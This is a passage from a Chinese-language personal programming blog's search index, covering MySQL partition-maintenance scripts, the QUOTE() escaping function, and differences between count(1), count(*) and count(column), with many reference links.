$&#123;LOG_DIR&#125; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">    $&#123;MKDIR&#125; -p $&#123;LOG_DIR&#125;</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">if [ ! -d $&#123;INI_DIR&#125; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">    $&#123;MKDIR&#125; -p $&#123;INI_DIR&#125;</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">LOG_FILE=$&#123;LOG_DIR&#125;/$&#123;OPT_NAME&#125;.log</span><br><span class=\"line\"></span><br><span class=\"line\">#config section end</span><br><span class=\"line\"></span><br><span class=\"line\">#working start</span><br><span class=\"line\">CURRENT_DATE=`$&#123;DATE&#125; +&apos;%Y-%m-%d&apos;`</span><br><span class=\"line\">echo &quot;$&#123;CURRENT_DATE&#125; everything is ok, runing start&quot; &gt;&gt; $&#123;LOG_FILE&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#loop read the partition table and column</span><br><span class=\"line\">while read TAB_NAME COL_NAME</span><br><span class=\"line\">do</span><br><span class=\"line\"></span><br><span class=\"line\">COUNTER=1</span><br><span class=\"line\">CURRENT_YEAR=`date +%Y`</span><br><span class=\"line\">#check the next month</span><br><span class=\"line\">NEXT_MONTH=`date -d next-month +%m`</span><br><span class=\"line\"></span><br><span class=\"line\">#check the next month has many days</span><br><span class=\"line\">case $&#123;NEXT_MONTH&#125; in</span><br><span class=\"line\">            1|01|3|03|5|05|7|07|8|08|10|12)</span><br><span class=\"line\">                                           CURRENT_DAY=31</span><br><span class=\"line\">            ;;</span><br><span class=\"line\">            4|04|6|06|9|09|11)</span><br><span class=\"line\">                              CURRENT_DAY=30</span><br><span class=\"line\">            ;;</span><br><span class=\"line\">            2|02)</span><br><span class=\"line\">                if [ `expr $&#123;CURRENT_YEAR&#125; % 4` -eq 0 ]; then</span><br><span class=\"line\">                        if [ `expr $&#123;CURRENT_YEAR&#125; % 400` -eq 0 ]; then</span><br><span class=\"line\">                                CURRENT_DAY=29</span><br><span class=\"line\">                        elif [ `expr $&#123;CURRENT_YEAR&#125; % 100` -eq 0 ]; then</span><br><span class=\"line\">                                CURRENT_DAY=28</span><br><span class=\"line\">                        else</span><br><span class=\"line\">                                CURRENT_DAY=29</span><br><span class=\"line\">                        fi</span><br><span class=\"line\">                else</span><br><span class=\"line\">                        CURRENT_DAY=28</span><br><span class=\"line\">                fi</span><br><span class=\"line\">             ;;</span><br><span class=\"line\">esac</span><br><span class=\"line\"></span><br><span class=\"line\">#work start add the every day partition</span><br><span class=\"line\">while [ $&#123;COUNTER&#125; -le $&#123;CURRENT_DAY&#125; ]</span><br><span class=\"line\"></span><br><span class=\"line\">do</span><br><span class=\"line\"></span><br><span class=\"line\">#calculate the current day&apos;s next &#123;counter&#125; day</span><br><span class=\"line\">PATNAME_DATE=`date -d &quot;$&#123;COUNTER&#125; days&quot; +%Y%m%d`</span><br><span class=\"line\">COUNTER=`expr $&#123;COUNTER&#125; + 1`</span><br><span class=\"line\">PAT_DATE=`date -d &quot;$&#123;COUNTER&#125; days&quot; +%Y%m%d`</span><br><span class=\"line\"></span><br><span class=\"line\">#change the unix_timestamp</span><br><span class=\"line\">PAT_UNIX_TIMESTAMP=`$&#123;MYSQL_DIR&#125; $&#123;CONN_MYSQL&#125; &lt;&lt;EOF</span><br><span class=\"line\">use $&#123;DB&#125;;</span><br><span class=\"line\">select UNIX_TIMESTAMP(&apos;$&#123;PAT_DATE&#125;&apos;);</span><br><span class=\"line\">EOF`</span><br><span class=\"line\"></span><br><span class=\"line\">##add partition sql</span><br><span class=\"line\">V_SQL=&quot;ALTER TABLE $&#123;DB&#125;.&quot;$&#123;TAB_NAME&#125;&quot; ADD PARTITION (PARTITION P&quot;$&#123;PATNAME_DATE&#125;&quot; VALUES LESS THAN (&quot;$&#123;PAT_UNIX_TIMESTAMP&#125;&quot;));&quot;</span><br><span class=\"line\">echo $V_SQL</span><br><span class=\"line\"></span><br><span class=\"line\">#exec the sql</span><br><span class=\"line\">$&#123;MYSQL_DIR&#125; $&#123;CONN_MYSQL&#125; &lt;&lt;EOF</span><br><span class=\"line\">use $&#123;DB&#125;;</span><br><span class=\"line\">$V_SQL;</span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\">done</span><br><span class=\"line\">done&lt;./Logdb_Partition.ini</span><br><span class=\"line\"></span><br><span class=\"line\">#working end</span><br><span class=\"line\">END_DATE=`$&#123;DATE&#125; +&apos;%Y-%m-%d %H:%M:%S&apos;`</span><br><span class=\"line\">echo &quot;$&#123;END_DATE&#125; runing finished&quot; &gt;&gt; $&#123;LOG_FILE&#125;</span><br><span class=\"line\">echo -e &quot;\\n--------------------------------------------------------------------&quot; &gt;&gt; $&#123;LOG_FILE&#125;</span><br></pre></td></tr></table></figure><br><br></details>\n\n<ul>\n<li><a href=\"https://www.dbavalley.com/partition-maintainance-script-for-mysql/\" target=\"_blank\" rel=\"noopener\">Partition maintainance script for Mysql – Database Administration Blog</a></li>\n<li><a href=\"https://www.oschina.net/question/146658_55659\" target=\"_blank\" rel=\"noopener\">mysql 能不能自动按日期分区（3个月如果手写要写90个partition） - OSCHINA</a></li>\n</ul>\n<details><br>  <summary>本文備份</summary><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> MYSQL-- 每半月一个分区，自动维护</span><br><span class=\"line\"></span><br><span class=\"line\">分类： Mysql/postgreSQL</span><br><span class=\"line\"></span><br><span class=\"line\">2010-11-09 15:52:12</span><br><span class=\"line\"></span><br><span class=\"line\">建表语句</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">drop table if exists terminal_parameter;</span><br><span class=\"line\">CREATE TABLE `terminal_parameter` (</span><br><span class=\"line\">  `terminal_parameter_id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class=\"line\">  `serial` int(11) DEFAULT NULL,</span><br><span class=\"line\">  `network_type` char(1) DEFAULT NULL,</span><br><span class=\"line\">  `mcc` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `mnc` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `lac` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `cellid` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `bsic_psc` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `ta_ec_io` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `bcch_rxlev_rscp` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `arfcn_uarfcn` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `rxq` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `c1` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `c2` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `signal_intensity` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `error_rate` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `alarm_type` varchar(16) DEFAULT NULL,</span><br><span class=\"line\">  `txpower` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `small_running_number` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `createtime` datetime NOT NULL,</span><br><span class=\"line\">  `userid` int(8) NOT NULL,</span><br><span class=\"line\">  `terminal_id` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `state` char(1) DEFAULT &apos;0&apos;,</span><br><span class=\"line\">  `order_definition_id` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `order_code` varchar(20) DEFAULT NULL,</span><br><span class=\"line\">  `charg_voltage` float(8,2) DEFAULT NULL,</span><br><span class=\"line\">  `battery_voltage` float(8,2) DEFAULT NULL,</span><br><span class=\"line\">  `temprad` float(8,2) DEFAULT NULL,</span><br><span class=\"line\">  `run_state` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `switching_value1` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `switching_value2` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `bcch_freq` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `rxlev` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `rxlev_full` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `rxlev_sub` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `rxqual` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `rxqual_full` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `rxqual_sub` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `idle_ts` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `timing_advance` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `tch_efr_out` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `tch_efr_in` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `dtx` int(8) DEFAULT NULL,</span><br><span class=\"line\">  `major_cycle_frequency` int(8) DEFAULT NULL,</span><br><span class=\"line\">  PRIMARY KEY (`terminal_parameter_id`,`createtime`),</span><br><span class=\"line\">  KEY `idx_createtime` (`createtime`),</span><br><span class=\"line\">  KEY `idx_terminal_id` (`terminal_id`)</span><br><span class=\"line\">) ENGINE=InnoDB DEFAULT CHARSET=utf8</span><br><span class=\"line\">PARTITION BY RANGE(TO_DAYS (createtime))</span><br><span class=\"line\">(</span><br><span class=\"line\">PARTITION p20101115 VALUES LESS THAN (TO_DAYS(&apos;2010-11-15&apos;)),</span><br><span class=\"line\">PARTITION p20101130 VALUES LESS THAN (TO_DAYS(&apos;2010-11-30&apos;)),</span><br><span class=\"line\">PARTITION p20101215 VALUES LESS THAN (TO_DAYS(&apos;2010-12-15&apos;)),</span><br><span class=\"line\">PARTITION p20101231 VALUES LESS THAN (TO_DAYS(&apos;2010-12-31&apos;)),</span><br><span class=\"line\">PARTITION p20110115 VALUES LESS THAN (TO_DAYS(&apos;2011-01-15&apos;)),</span><br><span class=\"line\">PARTITION p20110131 VALUES LESS THAN (TO_DAYS(&apos;2011-01-31&apos;)),</span><br><span class=\"line\">PARTITION p20110215 VALUES LESS THAN (TO_DAYS(&apos;2011-02-15&apos;)),</span><br><span class=\"line\">PARTITION p20110228 VALUES LESS THAN (TO_DAYS(&apos;2011-02-28&apos;)),</span><br><span class=\"line\">PARTITION p20110315 VALUES LESS THAN (TO_DAYS(&apos;2011-03-15&apos;)),</span><br><span class=\"line\">PARTITION p20110331 VALUES LESS THAN (TO_DAYS(&apos;2011-03-31&apos;)),</span><br><span class=\"line\">PARTITION p20110415 VALUES LESS THAN (TO_DAYS(&apos;2011-04-15&apos;)),</span><br><span class=\"line\">PARTITION p20110430 VALUES LESS THAN (TO_DAYS(&apos;2011-04-30&apos;))</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">存储过程代码：</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">* 每隔15天执行一次</span><br><span class=\"line\">/* 程序功能：循环使用分区，每半个月一个分区，保留6个月的数据</span><br><span class=\"line\"> 时间：2010-11-09 */</span><br><span class=\"line\"> drop procedure if exists Set_Partition;</span><br><span class=\"line\"> create procedure Set_Partition()</span><br><span class=\"line\"> begin</span><br><span class=\"line\">/* 事务回滚，其实放这里没什么作用，ALTER TABLE是隐式提交，回滚不了的。*/</span><br><span class=\"line\">    declare exit handler for sqlexception rollback;</span><br><span class=\"line\">    start TRANSACTION;</span><br><span class=\"line\"> </span><br><span class=\"line\">/* 到系统表查出这个表的最大分区，得到最大分区的日期。在创建分区的时候，名称就以日期格式存放，方便后面维护 */</span><br><span class=\"line\">    select REPLACE(partition_name,&apos;p&apos;,&apos;&apos;) into @P12_Name from INFORMATION_SCHEMA.PARTITIONS where TABLE_SCHEMA=&apos;mydb_1&apos; and table_name=&apos;terminal_parameter&apos; order by partition_ordinal_position DESC limit 1;</span><br><span class=\"line\"></span><br><span class=\"line\">/* 判断最大分区的时间段，如果是前半个月的，那么根据情况需要加13,14,15,16天</span><br><span class=\"line\">   如果是后半个月的，那么直接加15天。 +0 是为了把日期都格式化成YYYYMMDD这样的格式*/</span><br><span class=\"line\">    IF (DAY(@P12_Name)&lt;=15) THEN</span><br><span class=\"line\">       CASE day(LAST_DAY(@P12_name))</span><br><span class=\"line\">          WHEN 31 THEN set @Max_date= date(DATE_ADD(@P12_Name+0,INTERVAL 16 DAY))+0 ;</span><br><span class=\"line\">          WHEN 30 THEN set @Max_date= date(DATE_ADD(@P12_Name+0,INTERVAL 15 DAY))+0 ;</span><br><span class=\"line\">          WHEN 29 THEN set @Max_date= date(DATE_ADD(@P12_Name+0,INTERVAL 14 DAY))+0 ;</span><br><span class=\"line\">          WHEN 28 THEN set @Max_date= date(DATE_ADD(@P12_Name+0,INTERVAL 13 DAY))+0 ;</span><br><span class=\"line\">       END CASE;</span><br><span class=\"line\">    ELSE</span><br><span class=\"line\">       set @Max_date= date(DATE_ADD(@P12_Name+0, INTERVAL 15 DAY))+0;</span><br><span class=\"line\">    END IF;</span><br><span class=\"line\"></span><br><span class=\"line\">/* 修改表，在最大分区的后面增加一个分区，时间范围加半个月 */</span><br><span class=\"line\">    SET @s1=concat(&apos;ALTER TABLE terminal_parameter ADD PARTITION (PARTITION p&apos;,@Max_date,&apos; VALUES LESS THAN (TO_DAYS (&apos;&apos;&apos;,date(@Max_date),&apos;&apos;&apos;)))&apos;);</span><br><span class=\"line\">    PREPARE stmt2 FROM @s1;</span><br><span class=\"line\">    EXECUTE stmt2;</span><br><span class=\"line\">    DEALLOCATE PREPARE stmt2;</span><br><span class=\"line\"></span><br><span class=\"line\">/* 取出最小的分区的名称，并删除掉 。</span><br><span class=\"line\">    注意：删除分区会同时删除分区内的数据，慎重 */</span><br><span class=\"line\">    select partition_name into @P0_Name from INFORMATION_SCHEMA.PARTITIONS where TABLE_SCHEMA=&apos;mydb_1&apos; and table_name=&apos;terminal_parameter&apos; order by partition_ordinal_position limit 1;</span><br><span class=\"line\">    SET @s=concat(&apos;ALTER TABLE terminal_parameter DROP PARTITION &apos;,@P0_Name);</span><br><span class=\"line\">    PREPARE stmt1 FROM @s;</span><br><span class=\"line\">    EXECUTE stmt1;</span><br><span class=\"line\">    DEALLOCATE PREPARE stmt1;</span><br><span class=\"line\"></span><br><span class=\"line\">/* 提交 */</span><br><span class=\"line\">    COMMIT ;</span><br><span class=\"line\"> end;</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">计划任务代码：</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">CREATE EVENT e_Set_Partition</span><br><span class=\"line\">          ON SCHEDULE</span><br><span class=\"line\">          EVERY 15 day STARTS &apos;2011-04-30 23:59:59&apos;</span><br><span class=\"line\">          DO</span><br><span class=\"line\">          call Set_Partition();</span><br></pre></td></tr></table></figure><br><br></details>\n\n<ul>\n<li><a href=\"http://blog.chinaunix.net/uid-24086995-id-127389.html\" target=\"_blank\" rel=\"noopener\">MYSQL– 每半月一个分区，自动维护-909413335-ChinaUnix博客</a></li>\n<li><a href=\"https://www.dbavalley.com/partition-maintainance-script-for-mysql/\" target=\"_blank\" rel=\"noopener\">Partition maintainance script for Mysql – Database Administration Blog</a></li>\n</ul>\n<p>其他連結:</p>\n<ul>\n<li><a href=\"https://www.dbavalley.com/partition-maintainance-script-for-mysql/\" target=\"_blank\" rel=\"noopener\">Partition maintainance script for Mysql – Database Administration Blog</a></li>\n<li><a href=\"https://blog.xuite.net/misgarlic/weblogic/314570030-MySQL+partition+table+%E5%88%9D%E9%AB%94%E9%A9%97\" target=\"_blank\" rel=\"noopener\">MySQL partition table 初體驗 @ 不大會寫程式 :: 隨意窩 Xuite日誌</a></li>\n<li><a href=\"https://xyz.cinc.biz/2015/07/mysql-partition.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: MySQL 資料表分區(partition)</a></li>\n<li><a href=\"http://blog.kenyang.net/2017/06/11/whats-mysql-partition\" target=\"_blank\" rel=\"noopener\">What’s MySQL partition</a></li>\n<li><a href=\"https://www.oschina.net/question/146658_55659\" target=\"_blank\" rel=\"noopener\">mysql 能不能自动按日期分区（3个月如果手写要写90个partition） - OSCHINA</a></li>\n<li><a href=\"https://stackoverflow.com/questions/29694539/error-1526-hy000-table-has-no-partition-for-value-1426566990/29695312\" target=\"_blank\" rel=\"noopener\">mysql - ERROR 1526 (HY000): Table has no partition for value 1426566990 - Stack Overflow</a></li>\n<li><a href=\"https://codingluka.com/modify-and-restore-mysql-partition/\" target=\"_blank\" rel=\"noopener\">Mysql - 如何修改 partition 並還原資料 - Luka’s notes</a></li>\n<li><a href=\"https://medium.com/corneltek/mysql-partition-and-innodb-c2b5982e3c04\" target=\"_blank\" rel=\"noopener\">MySQL Partition and InnoDB - CornelTEK - Medium</a></li>\n<li><a href=\"https://learnku.com/laravel/t/6566/high-concurrence-problem-cant-use-self-increasing-id-when-mysql-partition-is-used-if-uuid-and-time-are-combined-with-primary-keys-how-effective-is-the-query-pool-when-the-amount-of-data-is-large\" target=\"_blank\" rel=\"noopener\">[高并发问题] MySQL 分区的情况下不能使用自增 ID，若使用 UUID 与时间做联合主键，数据量特大时，查询库效率如何？ | Laravel China 社区</a></li>\n<li><a href=\"https://blog.csdn.net/barfoo/article/details/4242863\" target=\"_blank\" rel=\"noopener\">mysql 的 partition与key的关系、限制 - barfoo的专栏 - CSDN博客</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000011704687\" target=\"_blank\" rel=\"noopener\">聊聊partition的方式 - code-craft - SegmentFault 思否</a></li>\n<li><a href=\"https://stackoverflow.com/questions/47423873/mysql-partitioning-a-varchar60\" target=\"_blank\" rel=\"noopener\">MySQL Partitioning a VARCHAR(60) - Stack Overflow</a></li>\n<li><a href=\"http://haitian299.github.io/2016/05/26/mysql-partitioning/\" target=\"_blank\" rel=\"noopener\">［MySQL］MySQL分区与传统的分库分表 - 海天的笔记本 | haitian-coder</a></li>\n<li><a href=\"https://kkc.github.io/2017/07/07/mysql-partitioning/\" target=\"_blank\" rel=\"noopener\">MySQL partition 筆記 - Kakashi’s Blog</a></li>\n</ul>\n","categories":["MySQL"],"tags":["mysql","partition"]},{"title":"MySQL QUOTE() 跳脫字元小記","url":"/blog/2019/09/10/MySQL-QUOTE-%E8%B7%B3%E8%84%AB%E5%AD%97%E5%85%83%E5%B0%8F%E8%A8%98/","content":"<p>最近找 MySQL 有什麼跳脫字元函式<br>有爬到 <code>QUOTE()</code> 可以用<br>但比較特別</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT QUOTE(&apos;w3re&apos;&apos;source&apos;);</span><br><span class=\"line\">+-----------------------+</span><br><span class=\"line\">| QUOTE(&apos;w3re&apos;&apos;source&apos;) |</span><br><span class=\"line\">+-----------------------+</span><br><span class=\"line\">| &apos;w3re\\&apos;source&apos;        | </span><br><span class=\"line\">+-----------------------+</span><br><span class=\"line\">1 row in set (0.03 sec)</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.w3resource.com/mysql/string-functions/mysql-quote-function.php\" target=\"_blank\" rel=\"noopener\">MySQL QUOTE() function - w3resource</a></p>\n<h2 id=\"注意事項\"><a href=\"#注意事項\" class=\"headerlink\" title=\"注意事項\"></a>注意事項</h2><ul>\n<li><code>NULL</code> 會回傳 NULL 字串!!! 這一點還滿神奇的</li>\n<li>字串會被<code>&#39;</code>包住</li>\n</ul>\n<p>透過這種特性，我可以用 SQL 組我要的字串</p>\n<h3 id=\"組-sql-範例\"><a href=\"#組-sql-範例\" class=\"headerlink\" title=\"組 sql 範例\"></a>組 sql 範例</h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">concat</span>(<span class=\"string\">\"UPDATE oo SET a1 = \"</span>,quote(a1), <span class=\"string\">\", a2 = \"</span>,quote(a2), <span class=\"string\">\" WHERE id =\"</span>, bbb.id,<span class=\"string\">\";\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> xxxx</span><br><span class=\"line\"><span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> bbb <span class=\"keyword\">on</span> ........</span><br></pre></td></tr></table></figure>\n<p>組完可以匯出 csv<br>可以用我之前寫的<a href=\"https://github.com/malagege/sqlMakecsv\" target=\"_blank\" rel=\"noopener\">malagege/sqlMakecsv: for a sqltocsv package easy sample</a><br>這時候會發現 csv 內容每一行前後都會有 <code>&quot;</code><br>一行式 SQL 可以用正規化解決</p>\n<p>但是多行的呢?<br>我想到解決方法</p>\n<ol>\n<li>用csv2xlsx 轉 xlsx <a href=\"https://malagege.github.io/blog/2019/08/26/csv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95/\">csv2xlsx CSV 轉 Excel 方法 | 程式狂想筆記</a></li>\n</ol>\n<p>xlsx 複製裡面內容出來  發現還是有 <code>&quot;</code></p>\n<ol start=\"2\">\n<li>開啟 Word 把所有內容<code>選擇性天上→超連結貼上</code>上面，即可解決!!!</li>\n</ol>\n<p><code>QUOTE</code>跳脫字元函式可以解決<code>&quot;</code>,<code>&#39;</code>問題</p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"MySQL count 和 Like 查詢大小寫問題小記","url":"/blog/2018/12/19/MySQL-count-%E5%92%8C-Like-%E6%9F%A5%E8%A9%A2%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/","content":"<p>MySQL最近做<code>count</code>時候<br>發現有一個寫法很特別<br>特別記錄一下</p>\n<p>另外MySQL <code>like</code>查詢預設不分大小寫<br>其他DB我記得預設會分大小寫<br>不常寫應該很容易忘記</p>\n<a id=\"more\"></a>\n<h2 id=\"DB-LIKE到底有沒有分大小寫呢\"><a href=\"#DB-LIKE到底有沒有分大小寫呢\" class=\"headerlink\" title=\"DB  LIKE到底有沒有分大小寫呢?\"></a>DB  LIKE到底有沒有分大小寫呢?</h2><p>MySQL , SQL Server沒有分<br>Oracle,DB2有分</p>\n<blockquote>\n<p>要讓mysql查詢區分大小寫，可以：<br>    select * from table_name where binary a like ‘a%’<br><a href=\"http://inspiregate.com/programming/mysql/363-mysql-like-queries-are-case-sensitive.html\" target=\"_blank\" rel=\"noopener\">MySQL 的 LIKE 查詢區分大小寫 | InspireGate 派克空間</a></p>\n</blockquote>\n<ul>\n<li><a href=\"http://lanfar.pixnet.net/blog/post/40706817-sql%EF%BC%9Aselect%E8%8B%B1%E6%95%B8%E5%AD%97%E4%B8%8D%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E3%80%81%E4%B8%8D%E5%88%86%E5%85%A8%E5%8D%8A%E5%BD%A2%E3%80%81%E5%BF%BD\" target=\"_blank\" rel=\"noopener\">SQL：SELECT英數字不分大小寫、不分全半形、忽略空白 @ 姊姊❉心得報告 :: 痞客邦 ::</a></li>\n</ul>\n<p><a href=\"https://stackoverflow.com/questions/14007450/how-do-you-force-mysql-like-to-be-case-sensitive\" target=\"_blank\" rel=\"noopener\">sql - How do you force mysql LIKE to be case sensitive? - Stack Overflow</a></p>\n<p><a href=\"http://pclevin.blogspot.com/2014/05/oracle-sql-like.html\" target=\"_blank\" rel=\"noopener\">Java程式教學甘仔店: Oracle SQL LIKE的用法教學</a></p>\n<h2 id=\"count\"><a href=\"#count\" class=\"headerlink\" title=\"count\"></a>count</h2><p>今天問比較資深工程師會怎麼用<br>他說他會用<code>count(1)</code><br>不過仔細查看了一下<br><code>count(欄位)</code>是我平常使用的方法，我知道當<code>null</code>時候不會算進去<br><code>count(1)</code>會算<code>null</code>值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">执行效果上：  </span><br><span class=\"line\">count(*)包括了所有的列，相当于行数，在统计结果的时候，不会忽略列值为NULL  </span><br><span class=\"line\">count(1)包括了忽略所有列，用1代表代码行，在统计结果的时候，不会忽略列值为NULL  </span><br><span class=\"line\">count(列名)只包括列名那一列，在统计结果的时候，会忽略列值为空（这里的空不是只空字符串或者0，而是表示null）的计数，即某个字段值为NULL时，不统计。</span><br><span class=\"line\">--------------------- </span><br><span class=\"line\">作者：BigoSprite </span><br><span class=\"line\">来源：CSDN </span><br><span class=\"line\">原文：https://blog.csdn.net/iFuMI/article/details/77920767 </span><br><span class=\"line\">版权声明：本文为博主原创文章，转载请附上博文链接！</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/iFuMI/article/details/77920767\" target=\"_blank\" rel=\"noopener\">count(1)、count(*)与count(列名)的执行区别 - iFuMI的博客 - CSDN博客</a><br><a href=\"/blog/2018/12/19/MySQL-count-和-Like-查詢大小寫問題小記/web1.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://dotblogs.com.tw/jeff-yeh/2011/01/12/20767\" target=\"_blank\" rel=\"noopener\">Select Count(*) / Count(1) / Count(欄位名) 的差異 | Jeff 隨手記 - 點部落</a></p>\n<p>最近太忙了，因為還沒有時間消化<br>所以先放在這邊</p>\n<ul>\n<li><a href=\"https://www.softantenna.com/wp/software/fake2db/\" target=\"_blank\" rel=\"noopener\">Fake2db - もっともらしいダミーデータを作る事ができるPythonツール | ソフトアンテナブログ</a></li>\n<li><a href=\"https://github.com/bhrgu/fake2db-tests\" target=\"_blank\" rel=\"noopener\">bhrgu/fake2db-tests: Several tests for the fake2db project</a></li>\n<li><a href=\"https://hk.saowen.com/a/f3d3f46df39716db1ddd1a69d38c07a9e92b5793e5b745b6f5c0e64e07b9056c\" target=\"_blank\" rel=\"noopener\">MySQL-如何刪除hash表分區 - 掃文資訊</a></li>\n<li><a href=\"https://www.cnblogs.com/zhishan/p/3285055.html\" target=\"_blank\" rel=\"noopener\">MYSQL的分区字段，必须包含在主键字段内 - 王 庆 - 博客园</a></li>\n<li><a href=\"https://blog.csdn.net/barfoo/article/details/4242863\" target=\"_blank\" rel=\"noopener\">mysql 的 partition与key的关系、限制 - barfoo的专栏 - CSDN博客</a></li>\n<li><a href=\"https://hk.saowen.com/a/8354a112014a1c52bfd80f3d81b1ae06d2b2d59b1bc1fd71f57f5e614f42580c\" target=\"_blank\" rel=\"noopener\">mysql 表分區技術 - 掃文資訊</a></li>\n<li><a href=\"http://haitian299.github.io/2016/05/26/mysql-partitioning/\" target=\"_blank\" rel=\"noopener\">［MySQL］MySQL分区与传统的分库分表 - 海天的笔记本 | haitian-coder</a></li>\n<li><a href=\"https://stackoverflow.com/questions/47423873/mysql-partitioning-a-varchar60\" target=\"_blank\" rel=\"noopener\">MySQL Partitioning a VARCHAR(60) - Stack Overflow</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000011704687\" target=\"_blank\" rel=\"noopener\">聊聊partition的方式 - code-craft - SegmentFault 思否</a></li>\n<li><a href=\"https://www.cnblogs.com/ivictor/p/5033708.html\" target=\"_blank\" rel=\"noopener\">MySQL分区总结 - iVictor - 博客园</a></li>\n<li><a href=\"https://blog.xuite.net/superman23.lin/twblog/155325150-Orcale%E6%90%9C%E5%B0%8B%E8%B3%87%E6%96%99%E4%B8%94%E4%B8%8D%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB\" target=\"_blank\" rel=\"noopener\">Orcale搜尋資料且不分大小寫 @ 這是林葛格的窩 :: 隨意窩 Xuite日誌</a></li>\n<li><a href=\"http://lanfar.pixnet.net/blog/post/40706817-sql%EF%BC%9Aselect%E8%8B%B1%E6%95%B8%E5%AD%97%E4%B8%8D%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E3%80%81%E4%B8%8D%E5%88%86%E5%85%A8%E5%8D%8A%E5%BD%A2%E3%80%81%E5%BF%BD\" target=\"_blank\" rel=\"noopener\">SQL：SELECT英數字不分大小寫、不分全半形、忽略空白 @ 姊姊❉心得報告 :: 痞客邦 ::</a></li>\n<li><a href=\"https://dotblogs.com.tw/jeff-yeh/2011/01/12/20767\" target=\"_blank\" rel=\"noopener\">Select Count(*) / Count(1) / Count(欄位名) 的差異 | Jeff 隨手記 - 點部落</a></li>\n<li><a href=\"https://blog.csdn.net/iFuMI/article/details/77920767\" target=\"_blank\" rel=\"noopener\">count(1)、count(*)与count(列名)的执行区别 - iFuMI的博客 - CSDN博客</a></li>\n<li><a href=\"https://www.puritys.me/docs-blog/article-17-20%E8%90%AC%E7%AD%86%E8%B3%87%E6%96%99%EF%BC%8CMysql%E8%B3%87%E6%96%99%E5%BA%AB%E5%B0%B1%E8%B7%91%E4%B8%8D%E5%8B%95%E5%9B%89!-(%E6%8E%92%E5%BA%8F%E7%9B%B8%E9%97%9C\" target=\"_blank\" rel=\"noopener\">20萬筆資料，Mysql資料庫就跑不動囉! (排序相關)</a>.html)</li>\n<li><a href=\"https://serverfault.com/questions/586486/how-to-do-the-port-forwarding-from-one-ip-to-another-ip-in-same-network\" target=\"_blank\" rel=\"noopener\">linux - How to do the port forwarding from one ip to another ip in same network? - Server Fault</a></li>\n<li><a href=\"http://blog.davidou.org/archives/609\" target=\"_blank\" rel=\"noopener\">15個優化你的sql Query的方式 | Davidou的 Blog</a></li>\n<li><a href=\"https://www.google.com/search?client=firefox-b-ab&amp;q=Undefined+index+php\" target=\"_blank\" rel=\"noopener\">Undefined index php - Google 搜尋</a></li>\n<li><a href=\"http://alfredwebdesign.blogspot.com/2013/05/php-notice-undefined-index.html\" target=\"_blank\" rel=\"noopener\">網站設計筆記: PHP Notice: undefined index 完美解决方法</a></li>\n<li><a href=\"https://adon988.logdown.com/posts/4701973\" target=\"_blank\" rel=\"noopener\">[解決] PHP Notice: Undefined index和Undefined variable的解决方法 « 